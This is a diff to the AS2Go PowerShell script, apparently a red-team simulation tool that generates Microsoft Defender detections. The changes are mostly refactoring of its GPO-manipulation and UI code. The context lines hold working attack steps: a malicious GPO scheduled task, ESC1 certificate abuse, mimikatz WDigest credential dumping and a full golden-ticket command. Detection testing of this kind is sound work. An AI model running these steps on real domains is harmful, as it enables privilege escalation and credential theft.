@@ -21,7 +21,7 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2023-10-09
+last update: 2023-10-16
 File Name  : AS2Go.ps1 | Version 3.0.x
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
@@ -41,6 +41,10 @@ Purpose: Continue the use case or does not start the use case from the beginning
 .EXAMPLE
 PS> .\AS2Go.ps1 -SkipImages
 Purpose: Do not show the images in the browser
+
+.EXAMPLE
+PS> .\AS2Go.ps1 -SkipClearHost
+Purpose: Skip to clear the screen, after each major steps, e.g. for troubleshooting
 
 .EXAMPLE
 PS> .\AS2Go.ps1 -SkipCompromisedAccount
@@ -121,6 +125,7 @@ Param (
     [switch]$Continue,
     [Switch]$EnableLogging,
     [switch]$SkipImages,
+    [switch]$SkipClearHost,
     [switch]$SkipPopup,
     [switch]$SkipPasswordSpray,
     [switch]$SkipCompromisedAccount,
@@ -143,13 +148,18 @@ Param (
 ######                                                                     #####
 ################################################################################
 
-$lastupdate = "2023-10-09"
-$version = "3.0.1"
+$lastupdate = "2023-10-16"
+$version = "3.1.0"
 
-
-# 2023-10-08 | v3.0.1 |  UpdateSet-gPCmachineExtensionNames
+# 2023-10-11 | v3.1.0 |  Upload to Github
+# 2023-10-16 | v3.0.6 |  minor Updates
+# 2023-10-12 | v3.0.5 |  Update Function Search-ADGroupMemberShip
+# 2023-10-11 | v3.0.4 |  Add Switches SkipClearHost
+# 2023-10-11 | v3.0.3 |  Update Function Set-gPCmachineExtensionNames
+# 2023-10-10 | v3.0.2 |  Add Function New-GpCExtention
+# 2023-10-08 | v3.0.1 |  Update Function Set-gPCmachineExtensionNames
 # 2023-10-08 | v3.0.0 |  Upload to Github       
-# 2023-10-08 | v2.9.9 |  Update  Region Attack Level - DOMAIN COMPROMISED AND PERSISTENCE             
+# 2023-10-08 | v2.9.9 |  Update Region Attack Level - DOMAIN COMPROMISED AND PERSISTENCE             
 # 2023-10-06 | v2.9.8 |  Add-GPOScheduleTask & Add-TaskElementToFileScheduleTaskXml
 # 2023-09-28 | v2.9.7 |  Add-GPOUserRightAssignments
 # 2023-09-27 | v2.9.6 |  Set-gPCmachineExtensionNames
@@ -242,7 +252,7 @@ $stage00 = "Compromised User Account"
 $stage05 = "Bruce Force Or Pw Spray"
 $stage10 = "Reconnaissance"
 $stage20 = "Privilege Escalation"
-$stage25 = "Steal or Forge Authentication Certificates"
+$stage25 = "Misconfigured Certificate Template Attack (ESC1)"
 $stage27 = "Kerberoasting Attack"
 $stage30 = "Access Sensitive Data"
 $stage35 = "Exfiltrate Data"
@@ -270,6 +280,23 @@ $fgcG = "Gray"
 
 $WinVersion = [System.Environment]::OSVersion.Version.ToString()
 
+#[{00000000-0000-0000-0000-000000000000}{Tool Extension GUID 1}][{CSE GUID 1}{Tool Extension GUID 1}]
+#[{00000000-0000-0000-0000-000000000000}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}]
+#[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]
+$STARTGUID = "{00000000-0000-0000-0000-000000000000}"
+
+#Preference CSE GUID Local users and groups
+$CSEGUIDLocalUaG =  "{17D89FEC-5C44-4972-B12D-241CAEF74509}"
+$ToolGUIDLocalUaG = "{79F92669-4224-476C-9C5C-6EFB4D87DF4A}"
+
+#User Rights Assignment
+$CSEGUIDSecurity                = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"
+$ToolGUIDComputerPolicySettings = "{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}"
+
+#Preference CSE GUID Scheduled Tasks
+$CSEGUIDScheduledTask =  "{AADCED64-746C-4633-A97C-D61349046527}"
+$ToolGUIDScheduledTask = "{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}"
+
 #$GroupDA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-512") }).name
 #$GroupEA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-519") }).name
 #$GroupGPO = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-520") }).name
@@ -286,7 +313,7 @@ function MyTemplate {
 
     ################################################################################
     #####                                                                      ##### 
-    #####    Description                ######                                 
+    #####    Description         #####                                 
     #####                                                                      #####
     ################################################################################
 
@@ -306,18 +333,19 @@ function MyTemplate {
     return $true
 }
 
+
 function Set-gPCmachineExtensionNames {
 
     ################################################################################
     #####                                                                      ##### 
-    #####  Modifiy attribute gPCmachineExtensionNames to display GPO settings  #####                            
+    #####  Modifiy attribute gPCmachineExtensionNames to display GPO settings  ##### 
     #####                                                                      #####
     ################################################################################
 
     # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/12512ed6-0632-4e90-a112-d3d2cd41df6c
+    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpol/62d12924-6252-4052-996f-161d2b9019f4
 
-
-    Param([string] $GUID, [string] $CLSIDs)
+    Param([string] $GPOGUID, [string] $CSEGUID, [string] $TOOLGUID)
 
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
@@ -325,75 +353,130 @@ function Set-gPCmachineExtensionNames {
 
     [bool]$skipUpdate = $false
 
-    $GUID = "{" + $GUID + "}"
-    $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
-    $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
+    $GPOGUID = "{" + $GPOGUID + "}"
 
-    $Both = "[{00000000-0000-0000-0000-000000000000}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
-    $onlyGroup = "[{00000000-0000-0000-0000-000000000000}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"
-    $onlyScheduleTask = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
-    $default = "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"
-
-    $idScheduleTask = "{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}"
-    $idLocalGroup = "{79F92669-4224-476C-9C5C-6EFB4D87DF4A}"
-    $idUserRightsAssignment = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"
-
-    $GPO = Get-AdObject -Filter 'ObjectClass -eq "groupPolicyContainer" -and Name -eq $GUID' -Properties gPCmachineExtensionNames, DistinguishedName, name,objectClass | Select-Object gPCmachineExtensionNames, DistinguishedName
-    Write-Log -Message "    >> old value $($gpo.gPCmachineExtensionNames)"
-
-    if ($CLSIDs -eq "{0}") {
-        $newvalue = $default
+    $gpo = Get-AdObject -Filter 'ObjectClass -eq "groupPolicyContainer" -and Name -eq $GPOGUID' -Properties * | Select-Object gPCmachineExtensionNames, DistinguishedName
+    
+    if ($null -eq $gpo.gPCmachineExtensionNames) {
+        $gpo.gPCmachineExtensionNames = ""
     }
-    elseif ($CLSIDs -eq $ScheduledTasks) {
 
-        if ($null -eq $gpo.gPCmachineExtensionNames) {
-            $newvalue = $onlyScheduleTask
-        }
-        elseif ($gpo.gPCmachineExtensionNames.Contains($idLocalGroup)){
-            $newvalue = $Both
-        }
-        else {
-            $newvalue = $onlyScheduleTask
-        }
-    }
-    elseif ($CLSIDs -eq $Groups) {
-        if ($null -eq $gpo.gPCmachineExtensionNames) {
-            $newvalue = $onlyGroup
-        }
-        elseif ($gpo.gPCmachineExtensionNames.Contains($idScheduleTask)){
-            $newvalue = $Both
-        }
-        else {
-            $newvalue = $onlyGroup
-        }
-    }
-    elseif ($CLSIDs -eq $idUserRightsAssignment) {
+    Write-Log -Message "    >> current value $($gpo.gPCmachineExtensionNames)"
 
+    if ($TOOLGUID -eq $ToolGUIDScheduledTask) {
 
-        if ($null -eq $gpo.gPCmachineExtensionNames) {
-            $newvalue = $default
-        }
-        elseif ($gpo.gPCmachineExtensionNames.Contains($idUserRightsAssignment)){
+        if ($gpo.gPCmachineExtensionNames.Contains($ToolGUIDScheduledTask)) {
             $skipUpdate = $true
         }
         else {
-            $newvalue = $default
-            Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames=$newvalue}
+            $newvalue = New-GpCExtention -CSEGUID $CSEGUIDScheduledTask -TOOLGUID $ToolGUIDScheduledTask -OldValue $gpo.gPCmachineExtensionNames
         }
+    }
+    elseif ($TOOLGUID -eq $ToolGUIDLocalUaG) {
+
+        if ($gpo.gPCmachineExtensionNames.Contains($ToolGUIDLocalUaG)) {
+            $skipUpdate = $true
+        }
+        else {
+            $newvalue = New-GpCExtention -CSEGUID $CSEGUIDLocalUaG -TOOLGUID $ToolGUIDLocalUaG -OldValue $gpo.gPCmachineExtensionNames
+        }
+    }
+    elseif ($TOOLGUID -eq $ToolGUIDComputerPolicySettings) {
+
+        if ($gpo.gPCmachineExtensionNames.Contains($ToolGUIDComputerPolicySettings)) {
+            $skipUpdate = $true
+        }
+        else {
+            $newvalue = New-GpCExtention -CSEGUID $CSEGUIDSecurity -TOOLGUID $ToolGUIDComputerPolicySettings -OldValue $gpo.gPCmachineExtensionNames
+        }
+
     }
     else {
 
     }
 
-    If ($skipUpdate -eq $false){
-        Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames=$newvalue}
+    If ($skipUpdate -eq $false) {
+        Set-ADObject -Identity $gpo.DistinguishedName -Replace @{gPCMachineExtensionNames = $newvalue }
+        Write-Log -Message "    >> set new value $newvalue"
+    }
+    else {
+        Write-Log -Message "    >> no update required"
     }
 
-    Write-Log -Message "    >> new value $newvalue"
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
 
 }
+
+function New-GpCExtention {
+
+    ################################################################################
+    #####                                                                      #####
+    #####       Define the new gPCMachineExtensionNames value                  #####
+    #####             [{CSE GUID 1}{Tool Extension GUID 1}]                    #####
+    #####                                                                      #####
+    ################################################################################
+ 
+ 
+    Param([string] $OldValue, [string] $CSEGUID, [string] $TOOLGUID)
+ 
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
+ 
+   
+    Write-Host "CSE GUID  = $CSEGUID"
+    Write-host "TOOL GUID = $TOOLGUID"
+    Write-Host "Old Value = $OldValue" -ForegroundColor green
+    
+    #add the default prefix if missing
+    If (-not $OldValue.Contains($STARTGUID)) {
+       $OldValue = "[{00000000-0000-0000-0000-000000000000}]" + $OldValue
+    }
+ 
+    $result = $OldValue.split("[")
+ 
+    #skip for User Rights Assignment, not needed
+    If ($TOOLGUID -ne $ToolGUIDComputerPolicySettings) {
+       #define new prefix
+       $prefix = "[" + $result[1]
+ 
+       $prefix = $prefix.Replace("[", "").Replace("]", "")
+       $prefix = $prefix + $TOOLGUID
+    
+       $tempresult = $prefix.Split("{") | Sort-Object
+       $newPreFix = $tempresult -join "{"
+       $newPreFix = "[" + $newPreFix + "]"
+    }
+    else {
+       $newPreFix  = "[" + $result[1]
+    }
+    
+    #define new postfix
+    $postfix = ""
+    for ($i = 2; $i -lt $result.Count; $i++) {
+       $postfix = $postfix + "[" + $result[$i]
+    }
+
+ 
+    $TempValue = $postfix + "[" + $CSEGUID + $TOOLGUID + "]"
+    $result = $TempValue.Split("[") | Sort-Object
+    $newPostFix = $result -join "["
+ 
+    $newValue = $newPreFix + $newPostFix 
+ 
+    Write-Host "New Value = $newValue" -ForegroundColor Cyan
+    Write-Log -Message "    >> Cse  GUID = $CSEGUID"
+    Write-Log -Message "    >> Tool GUID = $TOOLGUID"
+    Write-Log -Message "    >> Old Value = $OldValue"
+    Write-Log -Message "    >> New Value = $newValue"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+ 
+ 
+    return $newValue
+ }
+ 
 
 function Add-GroupElementToFileGroupsXml {
 
@@ -409,11 +492,6 @@ function Add-GroupElementToFileGroupsXml {
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
-
-   # $GroupName = "GroupName2"
-   # $GroupSID = "S-1-5-32-552"
-   # $xmlFilePath = "c:\temp\1.xml"
-
 
     [xml]$xml = Get-Content $xmlFilePath
 
@@ -498,7 +576,9 @@ function Add-GPOUserRightAssignments {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
+   
+    
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        Add or Update User Rights Assignment"
     Write-Host "____________________________________________________________________`n"  
@@ -544,15 +624,13 @@ function Add-GPOUserRightAssignments {
                 start-sleep 1
                 Write-Log -Message "    >> created file: $infFilePath"
 
-                $idUserRightsAssignment = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"
-                Set-gPCmachineExtensionNames -GUID $ID -CLSIDs $idUserRightsAssignment
-
-
             }
             else {
                 Write-Log -Message "    >> found file: $infFilePath"
             }
         }
+
+        Set-gPCmachineExtensionNames -GPOGUID $ID -CSEGUID $CSEGUIDSecurity -TOOLGUID $ToolGUIDComputerPolicySettings
 
         $FileContent = Get-Content -Path $infFilePath
 
@@ -745,7 +823,7 @@ function Add-GPOScheduleTask {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        Add a Malicious Scheduled Task                         "
     Write-Host "____________________________________________________________________`n"  
@@ -783,10 +861,9 @@ function Add-GPOScheduleTask {
             $ScheduledTasksElement.SetAttribute("clsid", "{CC63F200-7309-4ba0-B154-A71CD118DBCC}")
             $xml.AppendChild($ScheduledTasksElement) | Out-Host
             $xml.Save($xmlFilePath)
-        
-            $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
-            $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
-            Set-gPCmachineExtensionNames -GUID $ID -CLSIDs $ScheduledTasks
+      
+
+
 
             Start-Sleep 1
             Add-TaskElementToFileScheduleTaskXml -xmlFilePath $xmlFilePath
@@ -798,7 +875,8 @@ function Add-GPOScheduleTask {
             Write-Log -Message "    >> found file: $xmlFilePath"
             Add-TaskElementToFileScheduleTaskXml -xmlFilePath $xmlFilePath
         }
-
+        
+        Set-gPCmachineExtensionNames -GPOGUID $ID -CSEGUID $CSEGUIDScheduledTask -TOOLGUID $ToolGUIDScheduledTask
 
 
        # Get-GPOSettings -ID $id -Name $name -postfix 'after'    
@@ -829,7 +907,7 @@ function Add-GPOMemberToBuiltinGroups {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        Add or Update to Built-in Admin Groups                         "
     Write-Host "____________________________________________________________________`n"
@@ -868,8 +946,6 @@ function Add-GPOMemberToBuiltinGroups {
 
         $GroupLocalAdmin = "Administrators (built-in)"
         $GroupRemoteDesktopUser = "Remote Desktop Users (built-in)"
-        $ScheduledTasks = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"
-        $Groups = "{3125E937-EB16-4b4c-9934-544FC6D24D26}"
 
         #first check for file .\Machine\Preferences\Groups\Groups.xml
         #and create the file if needed with a corresponding trustee
@@ -887,14 +963,15 @@ function Add-GPOMemberToBuiltinGroups {
             $xml.AppendChild($groupsElement) | Out-Host
             $xml.Save($xmlFilePath)
 
-            Set-gPCmachineExtensionNames -GUID $ID -CLSIDs $Groups
-            Start-Sleep 1
+
             Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
 
         }
  
         Write-Log -Message "    >> found file: $xmlFilePath"
-         
+       
+        Set-gPCmachineExtensionNames -GPOGUID $ID -CSEGUID $CSEGUIDSLocalUaG -TOOLGUID $ToolGUIDLocalUaG
+        Start-Sleep 1
             
         [xml]$xml = Get-Content $xmlFilePath
             
@@ -963,7 +1040,6 @@ function New-GPOManipulation {
     #####                                                                      #####
     ################################################################################
 
-
     Param([string] $ID, [String] $name)
 
     $myfunction = Get-FunctionName
@@ -974,7 +1050,7 @@ function New-GPOManipulation {
 
     Do {
         $repeat = $yes
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "       GPT Manipulation - Choose your Technique                     "
         Write-Host "____________________________________________________________________`n" 
@@ -982,14 +1058,10 @@ function New-GPOManipulation {
         Write-Host "During this attack, AS2Go will only add " -NoNewline
         Write-Host "Domain Users, Authenticated Users or Everyone" -ForegroundColor Yellow -NoNewline
         Write-Host "!`n"
-        
-        
-
         Write-Host "   M" -ForegroundColor Yellow -NoNewline; Write-Host " - to add members to the built-in Administrators & Remote Desktop Users Group"
         Write-Host "   S" -ForegroundColor Yellow -NoNewline; Write-Host " - to add a Schedule Task"
         Write-Host "   U" -ForegroundColor Yellow -NoNewline; Write-Host " - to add User Rights Assignment"
         Write-Host "`n   X" -ForegroundColor Yellow -NoNewline; Write-Host " - to EXIT the GPT Manipulation"
-
 
         If ($UnAttended) {
             $answer = $yes 
@@ -999,7 +1071,6 @@ function New-GPOManipulation {
             $answer = Get-Answer -question $question -defaultValue $GPOManipulation
         }
 
-
         switch ($answer) {
 
             "M" {
@@ -1008,13 +1079,11 @@ function New-GPOManipulation {
                 $GPOManipulation = "S"
             }
             "S" {
-
                 Add-GPOScheduleTask -ID $ID -Name $name
                 Get-GPOSettings -ID $ID -Name $name -postfix 'after'
                 $GPOManipulation = "U"
             }
             "U" {
-
                 Add-GPOUserRightAssignments -ID $ID -Name $name
                 Get-GPOSettings -ID $ID -Name $name -postfix 'after'
                 $GPOManipulation = "M"
@@ -1022,37 +1091,15 @@ function New-GPOManipulation {
             "X" {
                 $repeat = $no
             }
-
             default {
                 Write-Host "out of scope"
             }
         }
-        Clear-Host
-
+        If (-not $SkipClearHost){Clear-Host}
+        Write-Log -Message "    >>  last technique: $answer"
     } Until ($repeat -eq $no)
 
 
-
-   # Clear-Host
-    <#
-    
-
-    Write-Host "____________________________________________________________________`n" 
-    Write-Host "       GPT Manipulation - Choose your Technique                     "
-    Write-Host "____________________________________________________________________`n" 
-    Write-Host "  U" -ForegroundColor Yellow -NoNewline; Write-Host " - to add User Rights Assignment"
-    Write-Host "  B" -ForegroundColor Yellow -NoNewline; Write-Host " - to add members to the built-in Administrators & Remote Desktop Users Group"
-    Write-Host "  S" -ForegroundColor Yellow -NoNewline; Write-Host " - to add a Schedule Task"
-    
-
-
-    Write-host "`nSelected GPO " -NoNewline
-    Write-host "$name " -ForegroundColor Yellow
-
-    pause
-
-#>
-    Write-Log -Message "    >> using GPO Report $htmlfile "
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
 
@@ -1075,7 +1122,7 @@ function Get-GPOSettings {
     #region ################## main code | out- host #####################
 
     if (Get-Module -ListAvailable -Name GroupPolicy) {
-
+        Write-Log -Message "    >> GPO Name     $name"
 
         $htmlfile = ".\GP-$ID-$postfix.html"
         $gporeport = Get-GPOReport -Guid $id -ReportType Html
@@ -1086,7 +1133,7 @@ function Get-GPOSettings {
         Write-host "$name " -NoNewline -ForegroundColor Yellow
         Write-Host " settings to file $htmlfile."
 
-        Write-Log -Message "    >> using GPO Report $htmlfile "
+        Write-Log -Message "    >> GPO Settings $htmlfile "
         #endregion ####################### main code #########################
         Write-Log -Message "### End Function $myfunction ###"
     }
@@ -1139,7 +1186,7 @@ function Get-GPOLinkedOnDomain {
     }
 
     $i = $LinkedGPOs.Count
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "       GPT Manipulation - Choose a Group Policy                     "
     Write-Host "____________________________________________________________________`n" 
@@ -1152,18 +1199,14 @@ function Get-GPOLinkedOnDomain {
 
     do {
         do { 
-        
-            #$gpo = Read-Host "Type in the NUMBER of your preferred Group Policy, e.g. 0"
-
             $question = "Type in the NUMBER of your preferred Group Policy, e.g. 0? Default "
             $gpo = Get-Answer -question $question -defaultValue 0
 
-            if ($gpo -match "\b[0-$i]\b") {
+            if ($gpo -match '^\d+$' -and ([int]$gpo -ge 0 -and [int]$gpo -le $i)) {
                 $repeat = $no
-            }
-            else{
+            } else {
                 $repeat = $yes
-                Write-Host $gpo -NoNewline -ForegroundColor Yellow
+                Write-Host "`n     $gpo" -NoNewline -ForegroundColor Red
                 Write-Host " is out of scope!"
             }
 
@@ -1176,7 +1219,7 @@ function Get-GPOLinkedOnDomain {
     
     } Until ($repeat -eq $no)
 
-    Write-Log -Message "    >> using GPO $id"
+    Write-Log -Message "    >> using GPO $($LinkedGPOs[[int]$gpo].DisplayName) {$($LinkedGPOs[[int]$gpo].ID)}"
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
 
@@ -1199,7 +1242,7 @@ function Set-UseLogonCredential {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "      Enable UseLogonCredential to read credentials from memory     "
     Write-Host "____________________________________________________________________`n" 
@@ -1243,7 +1286,7 @@ function New-PrivilegesEscalationtoSystem {
 
         $domain = $env:USERDOMAIN
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "            Select your preferred PSExec Command                  "
         Write-Host "____________________________________________________________________`n" 
@@ -1404,7 +1447,6 @@ function Search-ADGroupMemberShip {
     #####                                                                      #####
     ################################################################################
 
-
     Param([string] $name, [string] $rID)
 
     $myfunction = Get-FunctionName
@@ -1412,12 +1454,12 @@ function Search-ADGroupMemberShip {
     #region ################## main code | out- host #####################
 
     [bool]$result = $false
-    
-
-    
+   
+  
     try {
-       
-        $results = Get-ADPrincipalGroupMembership -Identity $name | Select-Object sid, name -ErrorAction Stop
+
+        $dc = [System.Net.Dns]::GetHostByName(($env:logonserver).replace("\","")).HostName
+        $results = Get-ADPrincipalGroupMembership -Identity $name -ResourceContextServer $dc -ResourceContextPartition (get-addomain).DistinguishedName | Select-Object sid, name -ErrorAction Stop
         $temp = $results | Where-Object { $_.sid -like "*$rID" } | Select-Object name
         If ($temp) { $result = $true }
 
@@ -1435,11 +1477,8 @@ function Search-ADGroupMemberShip {
             write-host "Error: " -NoNewline -ForegroundColor Red
             Write-Host $_
         }
-
-
     }
         
-
     Write-Log -Message "    >> $name is memberof $rID - $result"
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
@@ -1986,7 +2025,7 @@ function Get-KerberosTGT {
     Write-Log -Message "### Start Function $myfunction ###"
     ################## main code | out- host #####################
     
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            FIRST try to connect to a DC c$ share            "
     Write-Host "____________________________________________________________________`n" 
@@ -1994,7 +2033,7 @@ function Get-KerberosTGT {
     $directory = "\\$myDC\c$"
     Get-DirContent -Path $directory
     pause
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
     Write-Host "____________________________________________________________________`n" 
     Write-Host " Request a ticket-granting ticket (TGT) by using the pfx certificate"
     Write-Host "____________________________________________________________________`n" 
@@ -2027,7 +2066,7 @@ function Get-KerberosTGT {
     $directory = "\\$myDC\c$"
     Get-DirContent -Path $directory
     pause
-    Clear-Host
+    If (-not $SkipClearHost){Clear-Host}
 
     klist
     pause
@@ -2643,7 +2682,7 @@ function New-AuthenticationCertificatesAttack {
     Set-KeyValue -key "LastStage" -NewValue $stage25
    # If ($showStep) { Show-Step -step "step_007.html" }
     Do {
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "    Attack Level - Exploiting Misconfigured Certificate Template    "
         Write-Host ""
@@ -2665,7 +2704,7 @@ function New-AuthenticationCertificatesAttack {
 
         If ($answer -eq $yes) {
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             write-log -Message "Start Attack Level - Steal or Forge Authentication Certificates"
             # define parameter
 
@@ -2676,7 +2715,7 @@ function New-AuthenticationCertificatesAttack {
 
 
             Do {
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "      Step 1 - Find Enrollment Certification Authority (CA)        "
                 Write-Host "____________________________________________________________________`n"    
@@ -2687,7 +2726,7 @@ function New-AuthenticationCertificatesAttack {
         #        $EnterpriseCA = Get-EnrollmentService
 
 
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
 
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "        ??? REPEAT | CA Enrollment Serivce ???           "
@@ -2702,7 +2741,7 @@ function New-AuthenticationCertificatesAttack {
 
             #endregion Step 1 - Get the Enterprise Certification Authority
 
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "Step 2 - Enumerate Misconfigured and (!) Published Certificate Templates"
             Write-Host "____________________________________________________________________`n"
@@ -2725,7 +2764,7 @@ function New-AuthenticationCertificatesAttack {
 
             #region Step 3 - Requesting Certificate with Certify
             Do {
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "      Step 3 - Request Certificate with Certify                           "
                 Write-Host "____________________________________________________________________`n"
@@ -2741,7 +2780,7 @@ function New-AuthenticationCertificatesAttack {
 
             #region Step 4 - Converting PEM to PFX via openSSL
             Do {
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "   Step 4 - Convert to PFX from PEM Certificate Type via Open SSL                "
                 Write-Host "____________________________________________________________________`n"
@@ -2758,7 +2797,7 @@ function New-AuthenticationCertificatesAttack {
             #region Step 5 - Request a Kerberos TGT
 
             Do {
-                Clear-Host
+                If (-not $SkipClearHost){Clear-Host}
                 Write-Host "____________________________________________________________________`n" 
                 Write-Host "  Step 5 - Request a Ticket Granting Ticket (TGT) with PFX Certificate   "
                 Write-Host "               for the user for which we minted the new certificate                  "
@@ -2779,7 +2818,7 @@ function New-AuthenticationCertificatesAttack {
         }
 
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
 
         Write-Host "____________________________________________________________________`n" 
         Write-Host "    ??? REPEAT | Attack Level - Steal or Forge Certificates ???           "
@@ -2929,7 +2968,7 @@ function New-CredentialTheftThroughMemoryAccess {
     #Show-Step -step "step_007.html"
     Do {
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "         Attack Level - Credential Theft Through Memory Access"
         Write-Host "____________________________________________________________________`n" 
@@ -2939,7 +2978,7 @@ function New-CredentialTheftThroughMemoryAccess {
         Invoke-Command -ScriptBlock { .\mimikatz.exe "log .\$logfile" "privilege::debug" "sekurlsa::wdigest" "exit" }
         Invoke-Item .\"HD-ClearPasswords.log"  
         Pause
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
 
         Write-Host "____________________________________________________________________`n" 
         Write-Host "        ??? REPEAT | Credential Theft Through Memory Access  ???           "
@@ -3021,7 +3060,7 @@ Function New-GoldenTicket {
 
 
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         Write-Host "____________________________________________________________________`n" 
         Write-Host "         Step 1 of 3 | dump the 'krbtgt' Hash                       "
         Write-Host "____________________________________________________________________`n"     
@@ -3040,7 +3079,7 @@ Function New-GoldenTicket {
         }
 
 
-        Clear-Host
+        If (-not $SkipClearHost){Clear-Host}
         $DomainSID = Get-KeyValue -key "DomainSID" 
         $MySearchBase = Get-KeyValue -key "MySearchBase"
         $krbtgtntml = Get-KeyValue -key "krbtgtntml"
@@ -3080,7 +3119,7 @@ Function New-GoldenTicket {
             Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit" }
             #Golden ticket for 'FU-20210816.111659 @ threatprotection.corp' successfully submitted for current session
             Pause
-            Clear-Host
+            If (-not $SkipClearHost){Clear-Host}
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        Displays a list of currently cached Kerberos tickets        "
             Write-Host "____________________________________________________________________`n" 
@@ -3095,7 +3134,7 @@ Function New-GoldenTicket {
             Pause
             
             
-            Clear-Host
